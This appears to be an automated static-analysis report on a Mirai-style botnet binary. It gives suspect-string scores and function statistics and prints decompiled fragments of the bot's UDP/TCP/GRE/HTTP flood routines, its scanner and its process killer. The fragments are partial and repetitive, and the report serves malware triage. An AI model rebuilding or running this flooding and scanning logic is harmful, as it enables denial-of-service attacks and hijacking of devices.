@@ -1,0 +1,1859 @@
+=============================================================================
+========	BINARY ID :c00f280fa47a671f759808c696608e6e4679541f==================================================
+================================================================================
+================================================================================
+========	STRINGS SUMMARY : =====================================================
+================================================================================
+TOTAL STRINGS COUNT :464
+SUPSCPECTED LINES COUNT :49
+SUPSCPECTED STRINGS COUNT (DISTINCT) :19
+SUPSCPECTED STRINGS WEIGHT :80
+SUSPECT STRING SCORE : [80 / 150] 53%
+USER AGENTS STRINGS COUNT :0
+STATIC IPs STRINGS COUNT :0
+DYNAMIC IPs STRINGS COUNT :0
+================================================================================
+========	STRINGS DETAILS : =====================================================
+================================================================================
+================================================================================
+========	SUSPECTED STRINGS : =====================================================
+================================================================================
+attack_get_opt_str
+attack_get_opt_int
+rand_next
+socket
+connect
+rand_alphastr
+fork
+getppid
+attack_start
+attack_ongoing
+scanner_init
+inet_addr
+attack_udp_generic
+attack_udp_vse
+attack_udp_dns
+attack_udp_plain
+attack_tcp_syn
+attack_tcp_ack
+attack_tcp_stomp
+attack_gre_ip
+attack_gre_eth
+attack_app_http
+LOCAL_ADDR
+checksum_tcpudp
+rand_str
+attack_get_opt_ip
+bind
+killer_pid
+killer_kill_by_port
+killer_realpath_len
+killer_realpath
+getpid
+sigprocmask
+util_local_addr
+rand_init
+attack_init
+killer_init
+pending_connection
+scanner_kill
+killer_kill
+attack_kill_all
+attack_parse
+scanner_pid
+scanner_rawpkt
+ HTTP/1.1\r\nUser-Agent: 
+\r\nHost: 
+http
+/proc/net/tcp
+abcdefghijklmnopqrstuvw012345678
+================================================================================
+========	USER AGENTS STRINGS : =====================================================
+================================================================================
+================================================================================
+========	STATIC IP ADRESSES : =====================================================
+================================================================================
+================================================================================
+========	DYNAMIC IP MASKS : =====================================================
+================================================================================
+================================================================================
+========	/proc FOLDER ACCESS : =====================================================
+================================================================================
+/proc/net/tcp
+================================================================================
+========	HISTORY TEMPERING : =====================================================
+================================================================================
+================================================================================
+========	AUTOINSTALL COMMANDS : =====================================================
+================================================================================
+================================================================================
+========	FUNCTIONS SUMMARY : =====================================================
+================================================================================
++++TOTAL FILE LINES			: 34447
++++TOTAL FUNCTIONS 			:62
++++LINES PER FUNCTION RATIO 	: 555.596774193548
++++SUSPECTED LINES COUNT 	: 845
++++SUSPECTED LINES RATIO 	: 2.45304380642727
+================================================================================
+========	WHILES SUMMARY : =====================================================
+================================================================================
++++TOTAL FILE LINES				: 34447
++++WHILE (TRUE) LINES			: 9355
++++WHILE (TRUE) LINES RATION		:27.1576624960084%
++++WHILE (TRUE) LOOPS COUNT		: 61
+================================================================================
+========	SYSTEM FILES SUMMARY : ================================================
+================================================================================
+================================================================================
+========	IP PATTERNS SUMMARY : =================================================
+================================================================================
+================================================================================
+========	SYSTEM CALLS SUMMARY : ================================================
+================================================================================
+================================================================================
+========	FUNCTIONS LIST : =======================================================
+================================================================================
+FUNCTION_NAME                                     |ARGS|LENGH   |SUSPCET_INSTRC|WHILE_INSTRC|
+----------------------------------------------------------------------------------------------
+main                                              |0   |899     |112           |256         |
+----------------------------------------------------------------------------------------------
+attack_udp_dns                                    |4   |1487    |105           |825         |
+----------------------------------------------------------------------------------------------
+scanner_init                                      |0   |4461    |84            |1359        |
+----------------------------------------------------------------------------------------------
+util_atoi                                         |2   |693     |76            |379         |
+----------------------------------------------------------------------------------------------
+killer_init                                       |0   |1426    |57            |780         |
+----------------------------------------------------------------------------------------------
+attack_tcp_stomp                                  |4   |959     |50            |490         |
+----------------------------------------------------------------------------------------------
+attack_app_http                                   |4   |2694    |42            |2222        |
+----------------------------------------------------------------------------------------------
+attack_tcp_ack                                    |4   |589     |33            |224         |
+----------------------------------------------------------------------------------------------
+attack_tcp_syn                                    |4   |602     |32            |238         |
+----------------------------------------------------------------------------------------------
+attack_gre_eth                                    |4   |609     |32            |248         |
+----------------------------------------------------------------------------------------------
+attack_udp_generic                                |4   |639     |24            |221         |
+----------------------------------------------------------------------------------------------
+attack_gre_ip                                     |4   |577     |24            |212         |
+----------------------------------------------------------------------------------------------
+killer_kill_by_port                               |1   |919     |23            |570         |
+----------------------------------------------------------------------------------------------
+attack_udp_vse                                    |4   |554     |22            |197         |
+----------------------------------------------------------------------------------------------
+attack_udp_plain                                  |4   |474     |21            |96          |
+----------------------------------------------------------------------------------------------
+resolv_lookup                                     |1   |896     |16            |574         |
+----------------------------------------------------------------------------------------------
+function_40a528                                   |0   |378     |10            |0           |
+----------------------------------------------------------------------------------------------
+rand_init                                         |0   |315     |7             |0           |
+----------------------------------------------------------------------------------------------
+util_local_addr                                   |0   |330     |6             |0           |
+----------------------------------------------------------------------------------------------
+attack_start                                      |6   |377     |5             |20          |
+----------------------------------------------------------------------------------------------
+attack_parse                                      |2   |561     |4             |105         |
+----------------------------------------------------------------------------------------------
+attack_get_opt_ip                                 |5   |357     |4             |21          |
+----------------------------------------------------------------------------------------------
+rand_alphastr                                     |2   |387     |3             |51          |
+----------------------------------------------------------------------------------------------
+util_memsearch                                    |4   |357     |3             |32          |
+----------------------------------------------------------------------------------------------
+util_stristr                                      |3   |393     |3             |59          |
+----------------------------------------------------------------------------------------------
+util_strncmp                                      |3   |406     |3             |29          |
+----------------------------------------------------------------------------------------------
+attack_get_opt_str                                |5   |346     |2             |15          |
+----------------------------------------------------------------------------------------------
+attack_kill_all                                   |0   |452     |2             |0           |
+----------------------------------------------------------------------------------------------
+util_fdgets                                       |3   |360     |2             |44          |
+----------------------------------------------------------------------------------------------
+rand_str                                          |2   |386     |2             |35          |
+----------------------------------------------------------------------------------------------
+killer_kill                                       |0   |315     |2             |0           |
+----------------------------------------------------------------------------------------------
+attack_get_opt_int                                |4   |357     |2             |21          |
+----------------------------------------------------------------------------------------------
+resolv_entries_free                               |1   |334     |2             |0           |
+----------------------------------------------------------------------------------------------
+util_strcmp                                       |2   |365     |2             |16          |
+----------------------------------------------------------------------------------------------
+util_itoa                                         |3   |434     |2             |16          |
+----------------------------------------------------------------------------------------------
+scanner_kill                                      |0   |340     |2             |0           |
+----------------------------------------------------------------------------------------------
+fd_ctrl                                           |0   |315     |1             |0           |
+----------------------------------------------------------------------------------------------
+function_40157c                                   |0   |329     |1             |0           |
+----------------------------------------------------------------------------------------------
+table_key                                         |0   |315     |1             |0           |
+----------------------------------------------------------------------------------------------
+util_strcpy                                       |2   |346     |1             |0           |
+----------------------------------------------------------------------------------------------
+_init                                             |0   |318     |1             |0           |
+----------------------------------------------------------------------------------------------
+fd_serv                                           |0   |315     |1             |0           |
+----------------------------------------------------------------------------------------------
+checksum_tcpudp                                   |4   |357     |1             |0           |
+----------------------------------------------------------------------------------------------
+entry_point                                       |1   |317     |1             |0           |
+----------------------------------------------------------------------------------------------
+_fini                                             |0   |317     |1             |0           |
+----------------------------------------------------------------------------------------------
+table_init                                        |0   |416     |1             |0           |
+----------------------------------------------------------------------------------------------
+table_unlock_val                                  |1   |354     |1             |0           |
+----------------------------------------------------------------------------------------------
+rand_next                                         |0   |320     |1             |0           |
+----------------------------------------------------------------------------------------------
+function_40c2b8                                   |3   |360     |1             |0           |
+----------------------------------------------------------------------------------------------
+_GLOBAL_OFFSET_TABLE_                             |0   |315     |1             |0           |
+----------------------------------------------------------------------------------------------
+__RLD_MAP                                         |0   |315     |1             |0           |
+----------------------------------------------------------------------------------------------
+util_zero                                         |2   |326     |1             |0           |
+----------------------------------------------------------------------------------------------
+table_retrieve_val                                |2   |322     |1             |0           |
+----------------------------------------------------------------------------------------------
+__uClibc_main                                     |0   |317     |1             |0           |
+----------------------------------------------------------------------------------------------
+attack_init                                       |0   |354     |1             |0           |
+----------------------------------------------------------------------------------------------
+checksum_generic                                  |2   |360     |1             |0           |
+----------------------------------------------------------------------------------------------
+util_strlen                                       |1   |329     |1             |0           |
+----------------------------------------------------------------------------------------------
+table_lock_val                                    |1   |354     |1             |0           |
+----------------------------------------------------------------------------------------------
+_ftext                                            |0   |354     |1             |0           |
+----------------------------------------------------------------------------------------------
+util_memcpy                                       |3   |333     |1             |0           |
+----------------------------------------------------------------------------------------------
+unknown_0                                         |1   |0       |0             |0           |
+----------------------------------------------------------------------------------------------
+resolve_func                                      |0   |0       |0             |0           |
+----------------------------------------------------------------------------------------------
+================================================================================
+========	FUNCTIONS SUSPECTED INSTRUNCTIONS : ===================================
+================================================================================
+=================FUNCTION : main ===================
+++++++++ FUNCTION START 17264
+++++++++ FUNCTION END 18163
+++++++++ FUNCTION LENGTH 899
+    sigprocmask(SIG_UNBLOCK, (struct _TYPEDEF_sigset_t *)&set, NULL);
+    int32_t fd = open((char *)&path, O_RDWR); // 0x40a984
+    struct sockaddr * addr;
+        int32_t fd2 = open((char *)&path2, O_RDWR); // 0x40af44
+                v307 = (4 * rand_next() & 12) + 12;
+                rand_alphastr((char *)&v305, v307);
+                v308 = rand_next();
+                rand_alphastr((char *)&v305, v310);
+                if (fork() >= 1) {
+            close(0);
+            close(1);
+            close(2);
+            attack_init();
+            killer_init();
+            while (true) {
+                while (true) {
+                int32_t sock2;
+                if (sock2 == -1) {
+                    if (v331 == sock2) {
+                            int32_t * v332 = (int32_t *)(v303 + 4 * sock2 / 32 + 428); // 0x40b2b4
+                            *v332 = *v332 | 1 << sock2;
+                            int32_t * v333 = (int32_t *)(v303 + 4 * sock2 / 32 + 172); // 0x40b144
+                            *v333 = *v333 | 1 << sock2;
+                            if (v323 < sock2) {
+                        if (sock2 != fd4) {
+                        fcntl(fd3, F_GETFL);
+                        int32_t sock; // 0x40b488
+                        connect(sock, addr, 16);
+                        send(sock2, (int32_t *)&buf3, 2, MSG_NOSIGNAL);
+                        getsockopt(0xffff, 0x1007, (int32_t)&option_name, &option_name, &option_len);
+                            close(fd5);
+                            int32_t v338 = rand_next(); // 0x40b524
+                            int32_t sock3; // bp-1612
+                            accept((int32_t)&sock3, (struct sockaddr *)&option_name, &option_name);
+                            scanner_kill();
+                            killer_kill();
+                            attack_kill_all();
+                            kill(-v311, SIGKILL);
+                        int32_t sock4; // 0x40b628
+                        send(sock4, &buf4, 4, MSG_NOSIGNAL);
+                        int32_t sock5; // 0x40b650
+                        send(sock5, (int32_t *)&buf3, 1, MSG_NOSIGNAL);
+                        case 11: {
+                            while (true) {
+                            int32_t sock6; // 0x40b67c
+                            int32_t v346 = send(sock6, &buf5, length, MSG_NOSIGNAL); // 0x40b680
+                        case 4: {
+                            int32_t sock7; // 0x40b6dc
+                            recv(sock7, (int32_t *)2, 0x4000, MSG_NOSIGNAL);
+                            int32_t sock8; // 0x40b708
+                            int32_t v355 = recv(sock8, &buf6, length2, MSG_NOSIGNAL); // 0x40b714
+                    int32_t v357 = sock2; // 0x40b3b4
+            return attack_parse(&buf6, v319);
+    close(fd7);
+                v307 = (4 * rand_next() & 12) + 12;
+                rand_alphastr((char *)&v305, v307);
+                v308 = rand_next();
+                rand_alphastr((char *)&v305, v310);
+                if (fork() >= 1) {
+            close(0);
+            close(1);
+            close(2);
+            attack_init();
+            killer_init();
+            while (true) {
+        rand_init();
+                close(0);
+                close(1);
+                close(2);
+                attack_init();
+                killer_init();
+                while (true) {
+        v307 = (4 * rand_next() & 12) + 12;
+        rand_alphastr((char *)&v305, v307);
+        v308 = rand_next();
+        rand_alphastr((char *)&v305, v310);
+        if (fork() >= 1) {
+        close(0);
+        close(1);
+        close(2);
+        attack_init();
+        killer_init();
+        while (true) {
+    rand_init();
+            close(0);
+            close(1);
+            close(2);
+            attack_init();
+            killer_init();
+            while (true) {
+        v307 = (4 * rand_next() & 12) + 12;
+        rand_alphastr((char *)&v305, v307);
+        v308 = rand_next();
+        rand_alphastr((char *)&v305, v310);
+        if (fork() >= 1) {
+        close(0);
+        close(1);
+        close(2);
+        attack_init();
+        killer_init();
+        while (true) {
+    v307 = (4 * rand_next() & 12) + 12;
+    rand_alphastr((char *)&v305, v307);
+    v308 = rand_next();
+    rand_alphastr((char *)&v305, v310);
+    if (fork() >= 1) {
+    close(0);
+    close(1);
+    close(2);
+    attack_init();
+    killer_init();
+    while (true) {
+=================FUNCTION : attack_udp_dns ===================
+++++++++ FUNCTION START 12001
+++++++++ FUNCTION END 13488
+++++++++ FUNCTION LENGTH 1487
+    struct sockaddr * v108;
+    attack_get_opt_int(v311, (int32_t *)fd, 2, 0);
+    int32_t v312 = attack_get_opt_int(v311, (int32_t *)fd, 3, 0xffff); // 0x4086a8
+    attack_get_opt_int(v311, (int32_t *)fd, 4, 64);
+    int32_t v313 = 0x1000000 * attack_get_opt_int(v311, (int32_t *)fd, 5, 0) / 0x1000000; // 0x408700
+    int32_t v314 = attack_get_opt_int(v311, (int32_t *)fd, 6, 0xffff); // 0x408714
+    int32_t v315 = attack_get_opt_int(v311, (int32_t *)fd, 7, 53); // 0x408734
+    int32_t v316 = attack_get_opt_int(v311, (int32_t *)fd, 9, 0xffff); // 0x408754
+    int32_t length = attack_get_opt_int(v311, (int32_t *)fd, 0, 12); // 0x408774
+    int32_t v318 = attack_get_opt_str(v311, (int32_t *)fd, 8, 0, (int32_t)&v317); // 0x408794
+    fd = open((char *)table_retrieve_val(30, NULL), O_RDONLY);
+    int32_t sock;
+    int32_t sock_fd; // 0x4089e4
+        close(fd);
+                while (true) {
+                        result = inet_addr((char *)cp);
+                        sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
+                        if (sock_fd == fd) {
+                        result2 = setsockopt(sock_fd, 0, 3, &option_value, 4);
+                            sock = sock_fd;
+                                while (true) {
+                            while (true) {
+                                result = inet_addr((char *)cp);
+                                sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
+                                if (sock_fd == fd) {
+                                result2 = setsockopt(sock_fd, 0, 3, &option_value, 4);
+                                    sock = sock_fd;
+                                        while (true) {
+                                                    while (true) {
+                                                            while (true) {
+                                                    sock = sock_fd;
+                                                    while (true) {
+                                                        while (true) {
+                                                        while (true) {
+                                                                        checksum_tcpudp(fd, v392 + 20, (int32_t)v403, v315 + 27);
+                                                                        sendto(sock, (int32_t *)fd, length, MSG_NOSIGNAL, (struct sockaddr *)dest_addr, 16);
+                                                                            while (true) {
+                                                                int32_t v411 = sock;
+                                        sock = sock_fd;
+                                    while (true) {
+                        case 32: {
+                        case 9: {
+                    while (true) {
+                            case 32: {
+                            case 9: {
+                        while (true) {
+                                case 32: {
+                                case 9: {
+                            while (true) {
+                                    case 32: {
+                                    case 9: {
+                                while (true) {
+                                        case 32: {
+                                        case 9: {
+                                    while (true) {
+                                            case 32: {
+                                            case 9: {
+                                        while (true) {
+                                                case 32: {
+                                                case 9: {
+                                            while (true) {
+                                                    case 32: {
+                                                    case 9: {
+                                                while (true) {
+                                                        case 32: {
+                                                        case 9: {
+                                                    while (true) {
+                                                            case 32: {
+                                                            case 9: {
+                                                        while (true) {
+                                                                case 32: {
+                                                                case 9: {
+                                                            while (true) {
+                                                                    case 32: {
+                                                                    case 9: {
+            v332 = rand_next() % 4;
+                            result4 = inet_addr((char *)cp);
+                        sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
+                        if (sock_fd == fd) {
+                        result2 = setsockopt(sock_fd, 0, 3, &option_value, 4);
+                            sock = sock_fd;
+                                while (true) {
+                            while (true) {
+            sock = v327;
+            while (true) {
+        v332 = rand_next() % 4;
+                        result4 = inet_addr((char *)cp);
+                    sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
+                    if (sock_fd == fd) {
+                    result2 = setsockopt(sock_fd, 0, 3, &option_value, 4);
+                        sock = sock_fd;
+                            while (true) {
+                        while (true) {
+        sock = v327;
+        while (true) {
+    v332 = rand_next() % 4;
+                    result4 = inet_addr((char *)cp);
+                sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
+                if (sock_fd == fd) {
+                result2 = setsockopt(sock_fd, 0, 3, &option_value, 4);
+                    sock = sock_fd;
+                        while (true) {
+                    while (true) {
+    sock = v327;
+    while (true) {
+=================FUNCTION : scanner_init ===================
+++++++++ FUNCTION START 21528
+++++++++ FUNCTION END 25989
+++++++++ FUNCTION LENGTH 4461
+    struct sockaddr * v104;
+    int32_t v299 = fork(); // 0x40c4fc
+    int32_t sock2; // 0x40d0d8
+            rand_init();
+            int32_t sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP); // 0x40c614
+            fd3 = sock_fd;
+            int32_t sock3;
+            if (sock_fd == v423) {
+                                    checksum_tcpudp(message, *(int32_t *)&v514, 0x1400, 20);
+                                    int32_t sock; // 0x40d054
+                                    sendto(sock, (int32_t *)message, 40, MSG_NOSIGNAL, (struct sockaddr *)dest_addr, 16);
+                                        while (true) {
+                                    while (true) {
+                                        v412 = recvfrom(sock2, buf, 1514, MSG_NOSIGNAL, NULL, NULL);
+                                        sock3 = 251;
+                                                                        v725 = sock3;
+                                                                            close(fd);
+                                                                                        uint32_t v791 = rand_next() % (int32_t)*v790; // 0x40e4f8
+                                                                                            while (true) {
+                                                                                                    if (v467 != sock3) {
+                                                                                result = close(fd2);
+                                                                                int32_t sock_fd2 = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP); // 0x40e374
+                                                                                sock3 = sock_fd2;
+                                                                                if (sock_fd2 == v432) {
+                                                                                    rand_next();
+                                                                                    resolv_entries_free(v526);
+                                                                                    if (connect(sock3, (struct sockaddr *)&addr, 16) == v432) {
+                                                                                        close(sock3);
+                                                                                    send(sock3, (int32_t *)buf2, 0x4000, MSG_NOSIGNAL);
+                                                                                    send(sock3, &buf3, 4, MSG_NOSIGNAL);
+                                                                                    send(sock3, (int32_t *)buf4, 2, MSG_NOSIGNAL);
+                                                                                    send(sock3, (int32_t *)(v469 + 12), 1, MSG_NOSIGNAL);
+                                                                                    send(sock3, (int32_t *)buf5, (int32_t)length, MSG_NOSIGNAL);
+                                                                                    send(sock3, (int32_t *)(v469 + 13), 1, MSG_NOSIGNAL);
+                                                                                    send(sock3, (int32_t *)buf6, length2, MSG_NOSIGNAL);
+                                                                                    close(sock3);
+                                                                                                int32_t sock4; // 0x40d90c
+                                                                                                                        while (true) {
+                                                                                                                while (true) {
+                                                                                                                while (true) {
+                                                                                                                    sock3 = 251;
+                                                                                                                                send(sock4, (int32_t *)(*(int32_t *)&v430 - 140), 2, MSG_NOSIGNAL);
+                                                                                                                                            int32_t sock5; // 0x40d9b0
+                                                                                                                                            send(sock5, (int32_t *)buf7, (int32_t)length3, MSG_NOSIGNAL);
+                                                                                                                                            int32_t sock6; // 0x40d9c4
+                                                                                                                                            send(sock6, (int32_t *)(*(int32_t *)&v430 - 140), 2, MSG_NOSIGNAL);
+                                                                                                                                                    int32_t sock7; // 0x40da90
+                                                                                                                                                    send(sock7, (int32_t *)table_retrieve_val(21, v1012), length4, MSG_NOSIGNAL);
+                                                                                                                                                    int32_t sock8; // 0x40daac
+                                                                                                                                                    send(sock8, (int32_t *)(*(int32_t *)&v430 - 140), 2, MSG_NOSIGNAL);
+                                                                                                                                                            int32_t sock9; // 0x40db90
+                                                                                                                                                            send(sock9, (int32_t *)buf8, buf3, MSG_NOSIGNAL);
+                                                                                                                                                            int32_t sock10; // 0x40dbac
+                                                                                                                                                            send(sock10, (int32_t *)(*(int32_t *)&v430 - 140), 2, MSG_NOSIGNAL);
+                                                                                                                                                                    int32_t sock11; // 0x40dc90
+                                                                                                                                                                    send(sock11, (int32_t *)table_retrieve_val(24, v1012), length4, MSG_NOSIGNAL);
+                                                                                                                                                                    int32_t sock12; // 0x40dcac
+                                                                                                                                                                    send(sock12, (int32_t *)(*(int32_t *)&v430 - 140), 2, MSG_NOSIGNAL);
+                                                                                                                                                                            int32_t sock13; // 0x40dd90
+                                                                                                                                                                            send(sock13, (int32_t *)buf9, buf3, MSG_NOSIGNAL);
+                                                                                                                                                                            int32_t sock14; // 0x40ddac
+                                                                                                                                                                            send(sock14, (int32_t *)(*(int32_t *)&v430 - 140), 2, MSG_NOSIGNAL);
+                                                                                                                                                                            int32_t v1055 = fork(); // 0x40def4
+                                                                                                                                                v1004 = sock6;
+                                                                                                                                    v980 = sock4;
+                                                                                                    send(sock4, (int32_t *)(*(int32_t *)&v430 - 140), 2, MSG_NOSIGNAL);
+                                                                                            int32_t sock15; // 0x40dffc
+                                                                                            send(sock15, (int32_t *)table_retrieve_val(23, (int32_t *)v814), length4, MSG_NOSIGNAL);
+                                                                                            int32_t sock16; // 0x40e018
+                                                                                            send(sock16, (int32_t *)(*(int32_t *)&v430 - 140), 2, MSG_NOSIGNAL);
+                                                                    int32_t v1072 = sock3; // 0x40d81c
+                fcntl(sock_fd, F_GETFL);
+                int32_t sock17; // 0x40c66c
+                if (setsockopt(sock17, 0, 3, &option_value, 4) == 0) {
+                    int32_t v1081 = rand_next(); // 0x40c6a0
+                        v1081 = rand_next();
+                    rand_next();
+                    rand_next();
+                    sock3 = v1085;
+        case 0x1700: {
+        case 0x1309: {
+    while (true) {
+        v412 = recvfrom(sock2, buf, 1514, MSG_NOSIGNAL, NULL, NULL);
+        while (true) {
+=================FUNCTION : util_atoi ===================
+++++++++ FUNCTION START 29156
+++++++++ FUNCTION END 29849
+++++++++ FUNCTION LENGTH 693
+    struct sockaddr * v108;
+    while (true) {
+            case 32: {
+                while (true) {
+                        case 32: {
+                            while (true) {
+                                    case 32: {
+                                        while (true) {
+                                                case 32: {
+                                                    while (true) {
+                                                            case 32: {
+                                                                while (true) {
+                                                                        case 32: {
+                                                                            while (true) {
+                                                                                    case 32: {
+                                                                                        while (true) {
+                                                                                                case 32: {
+                                                                                                    while (true) {
+                                                                                                            case 32: {
+                                                                                                                while (true) {
+                                                                                                                        case 32: {
+                                                                                                                            while (true) {
+                                                                                                                                    case 32: {
+                                                                                                                                        while (true) {
+                                                                                                                                                case 32: {
+                                                                                                                                                    while (true) {
+                                                                                                                                                            case 32: {
+                                                                                                                                                                while (true) {
+                                                                                                                                                                        case 32: {
+                                                                                                                                                                            while (true) {
+                                                                                                                                                                                    case 32: {
+                                                                                                                                                                                        while (true) {
+                                                                                                                                                                                                case 32: {
+                                                                                                                                                                                                    while (true) {
+                                                                                                                                                                                                            case 32: {
+                                                                                                                                                                                                                while (true) {
+                                                                                                                                                                                                                        case 32: {
+                                                                                                                                                                                                                            while (true) {
+                                                                                                                                                                                                                                    case 32: {
+                                                                                                                                                                                                                                        while (true) {
+                                                                                                                                                                                                                                                case 32: {
+                                                                                                                                                                                                                                                    while (true) {
+                                                                                                                                                                                                                                                            case 32: {
+                                                                                                                                                                                                                                                                while (true) {
+                                                                                                                                                                                                                                                                        case 32: {
+                                                                                                                                                                                                                                                                            while (true) {
+                                                                                                                                                                                                                                                                                    case 32: {
+                                                                                                                                                                                                                                                                                        while (true) {
+                                                                                                                                                                                                                                                                                                case 32: {
+                                                                                                                                                                                                                                                                                                    while (true) {
+                                                                                                                                                                                                                                                                                                            case 32: {
+                                                                                                                                                                                                                                                                                                            case 9: {
+                                                                                                                                                                                                                                                                                                case 9: {
+                                                                                                                                                                                                                                                                                    case 9: {
+                                                                                                                                                                                                                                                                        case 9: {
+                                                                                                                                                                                                                                                            case 9: {
+                                                                                                                                                                                                                                                case 9: {
+                                                                                                                                                                                                                                    case 9: {
+                                                                                                                                                                                                                        case 9: {
+                                                                                                                                                                                                            case 9: {
+                                                                                                                                                                                                case 9: {
+                                                                                                                                                                                    case 9: {
+                                                                                                                                                                        case 9: {
+                                                                                                                                                            case 9: {
+                                                                                                                                                case 9: {
+                                                                                                                                    case 9: {
+                                                                                                                        case 9: {
+                                                                                                            case 9: {
+                                                                                                case 9: {
+                                                                                    case 9: {
+                                                                        case 9: {
+                                                            case 9: {
+                                                case 9: {
+                                    case 9: {
+                        case 9: {
+            case 9: {
+=================FUNCTION : killer_init ===================
+++++++++ FUNCTION START 15454
+++++++++ FUNCTION END 16880
+++++++++ FUNCTION LENGTH 1426
+    struct sockaddr * v106;
+    int32_t v308 = fork(); // 0x40993c
+        fd = open((char *)&dirp, O_RDONLY);
+            close(fd4);
+        close(fd);
+        fd2 = open((char *)&path, O_RDONLY);
+                while (true) {
+                fd = open((char *)&dirp, O_RDONLY);
+                    v344 = close(fd5);
+                result = close(fd);
+                fd2 = open((char *)&path, O_RDONLY);
+                        while (true) {
+                v344 = close(fd5);
+        close(fd4);
+    killer_kill_by_port(0x1700);
+    int32_t sock_fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP); // 0x4099c0
+    if (sock_fd != v315) {
+        bind(sock_fd, (struct sockaddr *)&addr, 16);
+        listen(sock_fd, 1);
+    int32_t pid2 = getpid(); // 0x409aac
+    int32_t fd3 = open((char *)&buf, O_RDONLY); // 0x409b24
+    close(fd3);
+    struct __dirstream * v470 = opendir((char *)&dirp); // 0x409c30
+        while (true) {
+                while (true) {
+                    while (true) {
+                                    struct dirent * v361 = readdir((struct __dirstream *)&dirp); // 0x409ce4
+                                int32_t v363 = closedir((struct __dirstream *)&dirp); // 0x409d04
+                                kill(time_val, SIGKILL);
+                            int32_t pid = getpid(); // 0x409f44
+                                int32_t ppid = getppid(); // 0x409f60
+                                    fd = open((char *)&dirp, O_RDONLY);
+                                        close(fd4);
+                                    close(fd);
+                                    fd2 = open((char *)&path, O_RDONLY);
+                                            while (true) {
+                                    close(fd4);
+                            v344 = close(fd5);
+                        fd2 = open((char *)&path, O_RDONLY);
+                                            close(fd4);
+                            close(fd4);
+                            kill(time_val, SIGKILL);
+                                while (true) {
+                                                        while (true) {
+                                                            v344 = close(fd5);
+                                                                while (true) {
+                                                                    v344 = close(fd5);
+                                                                        while (true) {
+                                                                            v344 = close(fd5);
+                                                                                    close(fd4);
+                                                                                result = close(fd6);
+                                                                                int32_t v438 = kill(pid3, SIGKILL); // 0x40a3b8
+                                            close(fd4);
+                                            kill(time_val, SIGKILL);
+                                close(fd4);
+                        close(fd4);
+            closedir((struct __dirstream *)&dirp);
+=================FUNCTION : attack_tcp_stomp ===================
+++++++++ FUNCTION START 8166
+++++++++ FUNCTION END 9125
+++++++++ FUNCTION LENGTH 959
+    struct sockaddr * v107;
+    attack_get_opt_int(fd, (int32_t *)time_val, 2, 0);
+    int32_t v309 = attack_get_opt_int(fd, (int32_t *)time_val, 3, 0xffff); // 0x405b14
+    attack_get_opt_int(fd, (int32_t *)time_val, 4, 64);
+    int32_t v310 = 0x1000000 * attack_get_opt_int(fd, (int32_t *)time_val, 5, 1) / 0x1000000; // 0x405b6c
+    uint32_t v311 = attack_get_opt_int(fd, (int32_t *)time_val, 7, 0xffff); // 0x405b80
+    int32_t v313 = 0x1000000 * attack_get_opt_int(fd, (int32_t *)time_val, 11, 0) / 0x1000000; // 0x405bb8
+    int32_t v314 = 0x1000000 * attack_get_opt_int(fd, (int32_t *)time_val, 12, 1) / 0x1000000; // 0x405be0
+    int32_t v315 = attack_get_opt_int(fd, (int32_t *)time_val, 13, 1); // 0x405bf4
+    int32_t v316 = attack_get_opt_int(fd, (int32_t *)time_val, 14, 0); // 0x405c14
+    int32_t v317 = attack_get_opt_int(fd, (int32_t *)time_val, 15, 0); // 0x405c34
+    int32_t v318 = 0x1000000 * attack_get_opt_int(fd, (int32_t *)time_val, 16, 0) / 0x1000000; // 0x405c68
+    int32_t v319 = attack_get_opt_int(fd, (int32_t *)time_val, 0, 768); // 0x405c7c
+    int32_t v320 = 0x1000000 * attack_get_opt_int(fd, (int32_t *)time_val, 1, 1); // 0x405ca8
+    int32_t sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP); // 0x405cc0
+    if (sock_fd == -1) {
+    int32_t v321 = setsockopt(sock_fd, 0, 3, &option_value, 4); // 0x405d04
+        result = close(sock_fd);
+            struct sockaddr * v331 = (struct sockaddr *)&v330;
+            struct sockaddr * v351 = v331;
+                struct sockaddr * v367 = v331;
+                struct sockaddr * v385 = v367;
+                while (true) {
+                    while (true) {
+                    while (true) {
+                        struct sockaddr * v413;
+                                rand_next();
+                                return rand_str((int32_t *)(time_val + 40), v319);
+                                close(fd);
+                                result = close(sock_fd);
+                            struct sockaddr * v450 = v413;
+                            struct sockaddr * addr;
+                                uint32_t v477 = recvfrom(sock_fd, (int32_t *)buf, 256, MSG_NOSIGNAL, addr, (int32_t *)addr_len); // 0x405efc
+                            close(fd);
+                            int32_t sock_fd2 = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP); // 0x405f88
+                            fd = sock_fd2;
+                            if (sock_fd2 == -1) {
+                            fcntl(sock_fd2, F_GETFL);
+                                rand_next();
+                                rand_next();
+                                return rand_str((int32_t *)(time_val + 40), v319);
+                            int32_t v483 = rand_next(); // 0x4061d4
+                                connect(fd, (struct sockaddr *)addr2, 16);
+                            rand_next();
+                            rand_next();
+                            return rand_str((int32_t *)(time_val + 40), v319);
+                            checksum_tcpudp(time_val, fd, addr_len, v323);
+                            sendto(sock_fd, (int32_t *)time_val, v324 + 40, MSG_NOSIGNAL, (struct sockaddr *)dest_addr, 16);
+                        while (true) {
+            fcntl(fd2, F_GETFL);
+=================FUNCTION : attack_app_http ===================
+++++++++ FUNCTION START 1452
+++++++++ FUNCTION END 4146
+++++++++ FUNCTION LENGTH 2694
+    struct sockaddr * v101;
+    int32_t v307 = attack_get_opt_str(v305, a4, 21, 0, v304); // 0x4016d0
+    int32_t v310 = attack_get_opt_str(v306, (int32_t *)length, 20, v309 - 128, v307); // 0x4016f4
+    int32_t v312 = attack_get_opt_str(v306, (int32_t *)length, 8, 0, (int32_t)&v311); // 0x401714
+    int32_t v314 = attack_get_opt_str(v306, (int32_t *)length, 22, v313 - 124, (int32_t)&v311); // 0x401738
+    int32_t v315 = attack_get_opt_int(v306, (int32_t *)length, 24, 1); // 0x401758
+    int32_t v316 = attack_get_opt_int(v306, (int32_t *)length, 7, 80); // 0x401778
+                int32_t v343 = rand_next(); // 0x401ae0
+            int32_t v347 = rand_next(); // 0x401b50
